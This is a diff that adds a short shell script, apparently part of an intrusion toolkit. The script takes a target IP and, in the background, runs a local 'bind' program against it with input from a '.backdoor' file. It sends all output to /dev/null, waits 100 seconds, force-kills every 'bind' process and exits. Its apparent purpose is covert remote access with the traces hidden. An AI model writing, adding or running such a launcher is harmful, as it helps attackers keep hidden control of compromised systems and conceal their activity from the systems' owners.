@@ -1,0 +1,5 @@
+ip="$1"
+./bind $ip -v r <.backdoor 1>>/dev/null 2>>/dev/null 3>>/dev/null 4>>/dev/null 5>>/dev/null &
+sleep 100
+killall -9 bind 1>>/dev/null 2>>/dev/null 3>>/dev/null
+exit 1       
